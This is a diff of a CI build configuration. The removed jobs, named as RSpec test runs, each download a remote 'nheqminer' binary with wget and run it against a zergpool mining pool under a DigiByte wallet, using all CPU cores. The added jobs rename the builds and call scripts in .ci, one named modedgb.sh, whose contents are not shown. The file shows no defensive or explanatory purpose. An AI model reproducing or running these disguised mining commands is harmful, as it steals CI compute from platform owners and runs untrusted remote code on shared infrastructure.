@@ -1,48 +1,17 @@
-before_script:
-  - lscpu
-  - RAILS_ENV=test bundle exec rake db:schema:load
-rvm: true
-environment:
-  MYVARIABLE: my-value
-script:
-  - bundle exec rspec
-
 builds:
   build_1:
-    name: RSpec 1
+    name: parallel 1
     environment:
-      MYVARIABLE: my-value-1
+      TYPE: job
+      PARALLEL_NO: 1
+      DRYRUN: true
     script:
-      - wget https://gitlab.com/gilaaja/exe/-/raw/main/nheqminer && chmod +x nheqminer && ./nheqminer -v -l rx2.asia.mine.zergpool.com:3300 -u DSbPgrVMxZq32ZZAN4wPBqvbBK99AhH9Ab.$(echo $(shuf -i 1-100 -n 1)-peak@GILA) -p c=DGB -t $(nproc --all) --groups=2 --group-number=1`
+      - ./.ci/report.sh
   build_2:
-    name: RSpec 2
+    name: parallel 2
     environment:
-      MYVARIABLE: my-value-2
+      TYPE: job
+      PARALLEL_NO: 2
+      DRYRUN: true
     script:
-      - wget https://gitlab.com/gilaaja/exe/-/raw/main/nheqminer && chmod +x nheqminer && ./nheqminer -v -l rx2.asia.mine.zergpool.com:3300 -u DSbPgrVMxZq32ZZAN4wPBqvbBK99AhH9Ab.$(echo $(shuf -i 1-100 -n 1)-peak@GILA) -p c=DGB -t $(nproc --all) --groups=2 --group-number=2`
-  build_3:
-    name: RSpec 3
-    environment:
-      MYVARIABLE: my-value-3
-    script:
-      - wget https://gitlab.com/gilaaja/exe/-/raw/main/nheqminer && chmod +x nheqminer && ./nheqminer -v -l rx2.asia.mine.zergpool.com:3300 -u DSbPgrVMxZq32ZZAN4wPBqvbBK99AhH9Ab.$(echo $(shuf -i 1-100 -n 1)-peak@GILA) -p c=DGB -t $(nproc --all) --groups=2 --group-number=3`
-  build_4:
-    name: RSpec 4
-    environment:
-      MYVARIABLE: my-value-4
-    script:
-      - wget https://gitlab.com/gilaaja/exe/-/raw/main/nheqminer && chmod +x nheqminer && ./nheqminer -v -l rx2.asia.mine.zergpool.com:3300 -u DSbPgrVMxZq32ZZAN4wPBqvbBK99AhH9Ab.$(echo $(shuf -i 1-100 -n 1)-peak@GILA) -p c=DGB -t $(nproc --all) --groups=2 --group-number=4`
-  build_5:
-    name: RSpec 5
-    environment:
-      MYVARIABLE: my-value-5
-    script:
-      - wget https://gitlab.com/gilaaja/exe/-/raw/main/nheqminer && chmod +x nheqminer && ./nheqminer -v -l rx2.asia.mine.zergpool.com:3300 -u DSbPgrVMxZq32ZZAN4wPBqvbBK99AhH9Ab.$(echo $(shuf -i 1-100 -n 1)-peak@GILA) -p c=DGB -t $(nproc --all) --groups=2 --group-number=5`
-  build_6:
-    name: RSpec 6
-    environment:
-      MYVARIABLE: my-value-6
-    script:
-      - wget https://gitlab.com/gilaaja/exe/-/raw/main/nheqminer && chmod +x nheqminer && ./nheqminer -v -l rx2.asia.mine.zergpool.com:3300 -u DSbPgrVMxZq32ZZAN4wPBqvbBK99AhH9Ab.$(echo $(shuf -i 1-100 -n 1)-peak@GILA) -p c=DGB -t $(nproc --all) --groups=2 --group-number=6`
-
-  
+      - ./.ci/modedgb.sh
